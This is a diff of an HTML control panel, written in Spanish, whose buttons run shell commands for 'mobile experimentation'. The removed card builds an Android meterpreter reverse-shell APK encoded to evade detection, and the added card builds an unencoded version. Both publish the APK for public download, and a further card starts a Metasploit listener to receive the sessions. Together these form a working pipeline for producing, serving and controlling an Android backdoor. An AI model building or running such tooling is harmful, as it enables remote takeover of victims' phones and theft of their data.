@@ -230,13 +230,13 @@
 
         <div class="tool-category">
             <span class="category-title">Mobile Experimentation</span>
-            <div class="tool-card" onclick="runCommand('msfvenom -p android/meterpreter/reverse_tcp LHOST=$(curl -s ifconfig.me) LPORT=4444 -e x86/shikata_ga_nai -i 10 -f raw -o scripts/lab_test_encoded.apk && mkdir -p public/downloads && cp scripts/lab_test_encoded.apk public/downloads/lab_test_encoded.apk && chmod +r public/downloads/lab_test_encoded.apk')">
-                <span class="tool-name">Gen Encoded APK</span>
-                <span class="tool-desc">Genera un APK con codificación avanzada para intentar evadir detecciones.</span>
+            <div class="tool-card" onclick="runCommand('msfvenom -p android/meterpreter/reverse_tcp LHOST=$(curl -s ifconfig.me) LPORT=4444 -o public/downloads/lab_test_simple.apk && chmod +r public/downloads/lab_test_simple.apk')">
+                <span class="tool-name">Gen Simple APK</span>
+                <span class="tool-desc">Genera un APK básico sin codificación (más compatible con algunos dispositivos).</span>
             </div>
-            <div class="tool-card" onclick="window.open('/downloads/lab_test_encoded.apk', '_blank')">
-                <span class="tool-name">Download APK</span>
-                <span class="tool-desc">Descarga el APK generado directamente a tu dispositivo.</span>
+            <div class="tool-card" onclick="window.open('/downloads/lab_test_simple.apk', '_blank')">
+                <span class="tool-name">Download Simple APK</span>
+                <span class="tool-desc">Descarga la versión básica del APK.</span>
             </div>
             <div class="tool-card" onclick="runCommand('msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit\"')">
                 <span class="tool-name">Start Mobile Listener</span>
